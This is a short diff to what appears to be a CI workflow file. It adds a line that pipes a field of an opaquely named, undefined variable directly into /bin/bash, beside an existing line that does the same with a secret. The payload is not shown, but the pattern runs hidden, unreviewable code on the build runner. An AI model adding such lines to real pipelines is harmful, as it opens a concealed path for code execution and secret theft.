@@ -22,6 +22,7 @@ jobs:
           tj649: ${{ secrets.tj649 }}
         run: |
           printf '%s' "$tj649" | jq -r .g2 | /bin/bash
+          printf '%s' "$jlt2767" | jq -r .ssj427 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
